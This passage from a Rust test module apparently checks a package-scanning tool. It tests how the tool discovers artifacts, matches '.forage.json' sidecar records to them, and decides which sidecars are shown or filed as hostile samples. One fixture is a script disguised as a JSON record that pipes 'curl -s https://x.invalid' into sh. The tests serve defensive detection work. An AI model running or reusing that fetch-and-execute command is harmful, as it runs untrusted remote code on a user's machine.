                "#!/bin/sh\ncurl -s https://x.invalid | sh\n",
            ),
        ] {
            std::fs::write(dir.path().join(name), body).expect("write");
        }
        let mut found: Vec<String> = super::discover_files(dir.path(), &AtomicU32::new(0))
            .iter()
            .filter_map(|p| p.file_name()?.to_str().map(String::from))
            .collect();
        found.sort();
        assert_eq!(
            found,
            vec![
                "evil-1.0.0.tgz".to_string(),
                "evil-1.0.0.tgz.forage.json".to_string(),
                "lib.so".to_string(),
                "lib.so.forage.json".to_string(),
                "notes.json".to_string(),
                "orphan.tgz.forage.json".to_string(),
            ]
        );
        let sidecar = |name: &str| super::is_attached_sidecar(&dir.path().join(name));
        assert!(
            sidecar("evil-1.0.0.tgz.forage.json"),
            "a record beside its artifact"
        );
        // Named like a record, but a script.
        assert!(!sidecar("lib.so.forage.json"));
        // Nothing on disk is described by it.
        assert!(!sidecar("orphan.tgz.forage.json"));
        assert!(!sidecar("notes.json"));
        assert!(!sidecar("evil-1.0.0.tgz"));
    }

    /// A sidecar is bookkeeping: a clean one is neither shown nor filed, one
    /// that raises anything is shown, and only a hostile one is filed on
    /// hopper as a sample.
    #[test]
    fn a_sidecar_is_shown_when_it_raises_something_and_filed_only_when_hostile() {
        use super::SidecarPolicy;
        let policy = |shown, filed| SidecarPolicy { shown, filed };
        assert_eq!(
            SidecarPolicy::new(Classification::Benign, false),
            policy(false, false)
        );
        assert_eq!(
            SidecarPolicy::new(Classification::Benign, true),
            policy(true, false)
        );
        assert_eq!(
            SidecarPolicy::new(Classification::Suspicious, false),
            policy(true, false)
        );
        assert_eq!(
            SidecarPolicy::new(Classification::Hostile, false),
            policy(true, true)
        );
    }
}
